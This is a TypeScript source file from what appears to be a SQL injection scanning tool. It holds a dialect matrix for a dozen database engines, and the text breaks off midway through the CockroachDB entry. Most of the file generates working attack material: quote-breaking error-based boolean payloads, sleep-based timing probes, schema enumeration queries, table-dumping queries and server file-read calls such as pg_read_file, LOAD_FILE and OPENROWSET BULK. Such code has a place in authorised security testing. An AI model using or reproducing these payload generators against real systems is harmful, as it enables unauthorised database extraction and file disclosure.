/**
 * Sentinel SQL X — Apex Sovereign Core: Dialect Capability Matrix
 *
 * Master declarative matrix defining syntax capabilities, query templates,
 * casting functions, batch multi-row aggregations, and runtime exception
 * triggers across all SQL and NewSQL database engines.
 */

import { DbmsType } from '../../../types/sqlScanner';

export interface DialectCapabilities {
  dbms: DbmsType;
  commentSingle: string;
  commentMulti: [string, string];
  stringConcatOp: string;
  stringConcatFn?: (parts: string[]) => string;
  substringFn: (expr: string, pos: number, len: number) => string;
  asciiFn: (expr: string) => string;
  charFn: (code: number) => string;
  lengthFn: (expr: string) => string;
  limitOffset: (limit: number, offset: number) => string;
  limit1: string;
  castToInt: (expr: string) => string;
  castToString: (expr: string) => string;
  runtimeExceptionTrue: string;
  runtimeExceptionFalse: string;
  conditionalErrorWrapper: (condition: string, table?: string, where?: string) => { truePayload: string; falsePayload: string };
  batchAggregateRows: (expr: string, separator?: string) => string;
  bitandCondition?: (expr: string, mask: number) => string;
  sleepFn: (seconds: number) => string;
  versionQuery: string;
  currentUserQuery: string;
  currentDbQuery: string;
  tableCatalogQuery: (offset?: number, limit?: number) => string;
  columnCatalogQuery: (table: string, offset?: number, limit?: number) => string;
  dataDumpQuery: (table: string, columns: string[], limit?: number, where?: string) => string;
  fileReadFn?: (filePath: string) => string;
  databaseListQuery?: string;
  schemaListQuery?: string;
}

export class DialectMatrix {
  private static capabilities: Map<DbmsType, DialectCapabilities> = new Map();

  static {
    // ─── PostgreSQL ──────────────────────────────────────────────────────────
    this.capabilities.set('PostgreSQL', {
      dbms: 'PostgreSQL',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS text), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toLowerCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `COALESCE(CAST(${c} AS text),'')`).join("||':::'||");
        return `SELECT STRING_AGG(${concatExpr}, E'\\n') FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
      fileReadFn: (filePath: string) => `pg_read_file('${filePath}')`,
      databaseListQuery: "SELECT datname FROM pg_database WHERE datistemplate = false",
      schemaListQuery: "SELECT schema_name FROM information_schema.schemata",
    });

    // ─── MySQL / MariaDB ────────────────────────────────────────────────────
    const mySqlCap: DialectCapabilities = {
      dbms: 'MySQL',
      commentSingle: '#',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${offset},${limit}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS SIGNED)`,
      castToString: (expr) => `CAST((${expr}) AS CHAR)`,
      runtimeExceptionTrue: 'EXP(710)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT IF(${condition}, EXP(710), 1)${fromClause})-- -`,
          falsePayload: `' AND (SELECT IF(NOT (${condition}), EXP(710), 1)${fromClause})-- -`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT current_user()',
      currentDbQuery: 'SELECT database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() LIMIT ${offset},${limit}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name='${table}' LIMIT ${offset},${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = `CONCAT_WS(':::', ${columns.map((c) => `IFNULL(${c},'')`).join(',')})`;
        return `SELECT GROUP_CONCAT(${concatExpr} SEPARATOR 0x0a) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}) t`;
      },
      fileReadFn: (filePath: string) => `LOAD_FILE('${filePath}')`,
      databaseListQuery: "SELECT schema_name FROM information_schema.schemata",
      schemaListQuery: "SELECT schema_name FROM information_schema.schemata",
    };
    this.capabilities.set('MySQL', mySqlCap);
    this.capabilities.set('MariaDB', { ...mySqlCap, dbms: 'MariaDB' });

    // ─── Microsoft SQL Server ──────────────────────────────────────────────
    this.capabilities.set('Microsoft SQL Server', {
      dbms: 'Microsoft SQL Server',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '+',
      stringConcatFn: (parts) => parts.join('+'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LEN(${expr})`,
      limitOffset: (limit, offset) => `OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY`,
      limit1: 'TOP 1',
      castToInt: (expr) => `CONVERT(int, (${expr}))`,
      castToString: (expr) => `CONVERT(varchar(max), (${expr}))`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
        return {
          truePayload: `' AND 1=(SELECT TOP 1 CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})--`,
          falsePayload: `' AND 1=(SELECT TOP 1 CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})--`,
        };
      },
      batchAggregateRows: (expr, _sep = ':::') => `(SELECT ${expr} + ':::' FOR XML PATH(''))`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `WAITFOR DELAY '0:0:${seconds}'`,
      versionQuery: 'SELECT @@VERSION',
      currentUserQuery: 'SELECT SYSTEM_USER',
      currentDbQuery: 'SELECT DB_NAME()',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT TOP ${limit} name FROM sys.tables ORDER BY name`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT TOP ${limit} name FROM sys.columns WHERE object_id=OBJECT_ID('${table}') ORDER BY column_id`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `ISNULL(CAST(${c} AS varchar(max)),'')`).join("+':::'+");
        return `SELECT (SELECT TOP ${limit} ${concatExpr} + CHAR(10) FROM ${table} ${where ? `WHERE ${where}` : ''} FOR XML PATH(''))`;
      },
      fileReadFn: (filePath: string) => `(SELECT * FROM OPENROWSET(BULK '${filePath}', SINGLE_CLOB) AS x)`,
      databaseListQuery: "SELECT name FROM master..sysdatabases",
      schemaListQuery: "SELECT schema_name FROM information_schema.schemata",
    });

    // ─── Oracle ─────────────────────────────────────────────────────────────
    this.capabilities.set('Oracle', {
      dbms: 'Oracle',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => offset > 0 ? `OFFSET ${offset} ROWS FETCH NEXT ${limit} ROWS ONLY` : `FETCH FIRST ${limit} ROWS ONLY`,
      limit1: 'FETCH FIRST 1 ROWS ONLY',
      castToInt: (expr) => `TO_NUMBER((${expr}))`,
      castToString: (expr) => `TO_CHAR((${expr}))`,
      runtimeExceptionTrue: 'TO_CHAR(1/0)',
      runtimeExceptionFalse: "''",
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ' WHERE ROWNUM=1'}` : ' FROM dual';
        return {
          truePayload: `'||(SELECT CASE WHEN (${condition}) THEN TO_CHAR(1/0) ELSE '' END${fromClause})||'`,
          falsePayload: `'||(SELECT CASE WHEN (NOT (${condition})) THEN TO_CHAR(1/0) ELSE '' END${fromClause})||'`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(${expr}, '${sep}') WITHIN GROUP (ORDER BY 1)`,
      bitandCondition: (expr, mask) => `BITAND(${expr}, ${mask}) = ${mask}`,
      sleepFn: (seconds) => `dbms_pipe.receive_message(('a'),${seconds})`,
      versionQuery: 'SELECT banner FROM v$version WHERE ROWNUM=1',
      currentUserQuery: 'SELECT user FROM dual',
      currentDbQuery: 'SELECT ora_database_name FROM dual',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT table_name FROM user_tables WHERE ROWNUM<=${limit}`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT column_name FROM all_tab_columns WHERE table_name='${table.toUpperCase()}' AND ROWNUM<=${limit}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `NVL(TO_CHAR(${c}),'')`).join("||':::'||");
        return `SELECT LISTAGG(${concatExpr}, CHR(10)) WITHIN GROUP (ORDER BY 1) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where} AND ` : 'WHERE '} ROWNUM<=${limit})`;
      },
    });

    // ─── SQLite ─────────────────────────────────────────────────────────────
    this.capabilities.set('SQLite', {
      dbms: 'SQLite',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `UNICODE(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS text)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr}, '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (_seconds) => `randomblob(100000000)`,
      versionQuery: 'SELECT sqlite_version()',
      currentUserQuery: "SELECT 'sqlite_user'",
      currentDbQuery: "SELECT 'main'",
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT name FROM sqlite_master WHERE type='table' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, _offset = 0, _limit = 50) =>
        `SELECT sql FROM sqlite_master WHERE type='table' AND name='${table}'`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.map((c) => `IFNULL(${c},'')`).join("||':::'||");
        return `SELECT GROUP_CONCAT(${concatExpr}, CHAR(10)) FROM (SELECT * FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit})`;
      },
    });

    // ─── IBM Db2 ────────────────────────────────────────────────────────────
    this.capabilities.set('IBM Db2', {
      dbms: 'IBM Db2',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'FETCH FIRST 1 ROWS ONLY',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS varchar(255))`,
      runtimeExceptionTrue: '1/(SELECT 0 FROM SYSIBM.SYSDUMMY1)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} FETCH FIRST 1 ROWS ONLY` : ' FROM SYSIBM.SYSDUMMY1';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0 FROM SYSIBM.SYSDUMMY1) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0 FROM SYSIBM.SYSDUMMY1) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(${expr}, '${sep}')`,
      bitandCondition: (expr, mask) => `BITAND(${expr}, ${mask}) = ${mask}`,
      sleepFn: (_seconds) => `(SELECT COUNT(*) FROM syscat.columns AS c1, syscat.columns AS c2)`,
      versionQuery: 'SELECT versionnumber FROM sysibmadm.env_sys_info',
      currentUserQuery: 'SELECT user FROM sysibm.sysdummy1',
      currentDbQuery: 'SELECT current_server FROM sysibm.sysdummy1',
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT tabname FROM syscat.tables WHERE tabschema=CURRENT USER FETCH FIRST ${limit} ROWS ONLY`,
      columnCatalogQuery: (table, _offset = 0, limit = 50) =>
        `SELECT colname FROM syscat.columns WHERE tabname='${table.toUpperCase()}' FETCH FIRST ${limit} ROWS ONLY`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} FETCH FIRST ${limit} ROWS ONLY`;
      },
    });

    // ─── H2 Database ────────────────────────────────────────────────────────
    this.capabilities.set('H2', {
      dbms: 'H2',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHAR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS varchar)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/0 ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/0 ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `GROUP_CONCAT(${expr} SEPARATOR '${sep}')`,
      bitandCondition: (expr, mask) => `BITAND(${expr}, ${mask}) = ${mask}`,
      sleepFn: (_seconds) => `random_uuid()`,
      versionQuery: 'SELECT H2VERSION()',
      currentUserQuery: 'SELECT USER()',
      currentDbQuery: 'SELECT DATABASE()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='PUBLIC' LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toUpperCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Microsoft Access ───────────────────────────────────────────────────
    this.capabilities.set('Microsoft Access', {
      dbms: 'Microsoft Access',
      commentSingle: '%00',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '&',
      stringConcatFn: (parts) => parts.join('&'),
      substringFn: (expr, pos, len) => `MID(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASC(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LEN(${expr})`,
      limitOffset: (limit, _offset) => `TOP ${limit}`,
      limit1: 'TOP 1',
      castToInt: (expr) => `CINT(${expr})`,
      castToString: (expr) => `CSTR(${expr})`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''}` : '';
        return {
          truePayload: `' AND IIF(${condition}, 1/0, 1)=1${fromClause}`,
          falsePayload: `' AND IIF(${condition}, 1, 1/0)=1${fromClause}`,
        };
      },
      batchAggregateRows: (expr, _sep = ':::') => expr,
      bitandCondition: (expr, mask) => `((${expr}) AND ${mask}) = ${mask}`,
      sleepFn: (_seconds) => `IIF(1=1, 1, 1)`,
      versionQuery: 'SELECT @@VERSION',
      currentUserQuery: "SELECT 'MSAccess_User'",
      currentDbQuery: "SELECT 'MSAccess_DB'",
      tableCatalogQuery: (_offset = 0, limit = 50) =>
        `SELECT TOP ${limit} Name FROM MSysObjects WHERE Type=1 AND Flags=0`,
      columnCatalogQuery: (_table, _offset = 0, _limit = 50) =>
        `SELECT TOP 50 Name FROM MSysObjects`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join('&');
        return `SELECT TOP ${limit} ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''}`;
      },
    });

    // ─── Generic SQL Fallback ────────────────────────────────────────────────
    this.capabilities.set('Generic SQL', {
      dbms: 'Generic SQL',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS int)`,
      castToString: (expr) => `CAST((${expr}) AS varchar(255))`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS varchar(255)), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT @@version',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Snowflake ──────────────────────────────────────────────────────────
    this.capabilities.set('Snowflake', {
      dbms: 'Snowflake',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS integer)`,
      castToString: (expr) => `CAST((${expr}) AS string)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND IFF(${condition}, 1/0, 1)=1${fromClause}--`,
          falsePayload: `' AND IFF(NOT(${condition}), 1/0, 1)=1${fromClause}--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `LISTAGG(${expr}, '${sep}')`,
      bitandCondition: (expr, mask) => `BITAND(${expr}, ${mask}) = ${mask}`,
      sleepFn: (seconds) => `SYSTEM$WAIT(${seconds})`,
      versionQuery: 'SELECT CURRENT_VERSION()',
      currentUserQuery: 'SELECT CURRENT_USER()',
      currentDbQuery: 'SELECT CURRENT_DATABASE()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema=CURRENT_SCHEMA() LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM information_schema.columns WHERE table_name='${table.toUpperCase()}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── Google BigQuery ────────────────────────────────────────────────────
    this.capabilities.set('Google BigQuery', {
      dbms: 'Google BigQuery',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => `CONCAT(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `SUBSTR(${expr},${pos},${len})`,
      asciiFn: (expr) => `TO_CODE_POINTS(${expr})[OFFSET(0)]`,
      charFn: (code) => `CODE_POINTS_TO_STRING([${code}])`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS INT64)`,
      castToString: (expr) => `CAST((${expr}) AS STRING)`,
      runtimeExceptionTrue: '1/0',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND IF(${condition}, 1/0, 1)=1${fromClause}--`,
          falsePayload: `' AND IF(NOT(${condition}), 1/0, 1)=1${fromClause}--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS STRING), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (_seconds) => `(SELECT COUNT(*) FROM UNNEST(GENERATE_ARRAY(1, 2000000)))`,
      versionQuery: "SELECT 'Google BigQuery'",
      currentUserQuery: 'SELECT SESSION_USER()',
      currentDbQuery: 'SELECT @@project_id',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM \`region-us\`.INFORMATION_SCHEMA.TABLES LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT column_name FROM \`region-us\`.INFORMATION_SCHEMA.COLUMNS WHERE table_name='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── ClickHouse ─────────────────────────────────────────────────────────
    this.capabilities.set('ClickHouse', {
      dbms: 'ClickHouse',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: ' ',
      stringConcatFn: (parts) => `concat(${parts.join(',')})`,
      substringFn: (expr, pos, len) => `substring(${expr},${pos},${len})`,
      asciiFn: (expr) => `ascii(${expr})`,
      charFn: (code) => `char(${code})`,
      lengthFn: (expr) => `length(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `toInt64(${expr})`,
      castToString: (expr) => `toString(${expr})`,
      runtimeExceptionTrue: 'throwIf(1)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND if(${condition}, throwIf(1), 1)=1${fromClause}--`,
          falsePayload: `' AND if(NOT(${condition}), throwIf(1), 1)=1${fromClause}--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `arrayStringConcat(groupArray(toString(${expr})), '${sep}')`,
      bitandCondition: (expr, mask) => `bitAnd(${expr}, ${mask}) = ${mask}`,
      sleepFn: (seconds) => `sleep(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT currentUser()',
      currentDbQuery: 'SELECT currentDatabase()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT name FROM system.tables LIMIT ${limit} OFFSET ${offset}`,
      columnCatalogQuery: (table, offset = 0, limit = 50) =>
        `SELECT name FROM system.columns WHERE table='${table}' LIMIT ${limit} OFFSET ${offset}`,
      dataDumpQuery: (table, columns, limit = 20, where) => {
        const concatExpr = columns.join("||':::'||");
        return `SELECT ${concatExpr} FROM ${table} ${where ? `WHERE ${where}` : ''} LIMIT ${limit}`;
      },
    });

    // ─── CockroachDB ────────────────────────────────────────────────────────
    this.capabilities.set('CockroachDB', {
      dbms: 'CockroachDB',
      commentSingle: '--',
      commentMulti: ['/*', '*/'],
      stringConcatOp: '||',
      stringConcatFn: (parts) => parts.join('||'),
      substringFn: (expr, pos, len) => `SUBSTRING(${expr},${pos},${len})`,
      asciiFn: (expr) => `ASCII(${expr})`,
      charFn: (code) => `CHR(${code})`,
      lengthFn: (expr) => `LENGTH(${expr})`,
      limitOffset: (limit, offset) => `LIMIT ${limit} OFFSET ${offset}`,
      limit1: 'LIMIT 1',
      castToInt: (expr) => `CAST((${expr}) AS INT8)`,
      castToString: (expr) => `CAST((${expr}) AS STRING)`,
      runtimeExceptionTrue: '1/(SELECT 0)',
      runtimeExceptionFalse: '1',
      conditionalErrorWrapper: (condition, table, where) => {
        const fromClause = table ? ` FROM ${table}${where ? ` WHERE ${where}` : ''} LIMIT 1` : '';
        return {
          truePayload: `' AND (SELECT CASE WHEN (${condition}) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
          falsePayload: `' AND (SELECT CASE WHEN (NOT (${condition})) THEN 1/(SELECT 0) ELSE 1 END${fromClause})=1--`,
        };
      },
      batchAggregateRows: (expr, sep = ':::') => `STRING_AGG(CAST(${expr} AS STRING), '${sep}')`,
      bitandCondition: (expr, mask) => `((${expr}) & ${mask}) = ${mask}`,
      sleepFn: (seconds) => `pg_sleep(${seconds})`,
      versionQuery: 'SELECT version()',
      currentUserQuery: 'SELECT current_user',
      currentDbQuery: 'SELECT current_database()',
      tableCatalogQuery: (offset = 0, limit = 50) =>
        `SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit} OFFSET ${offset}`,
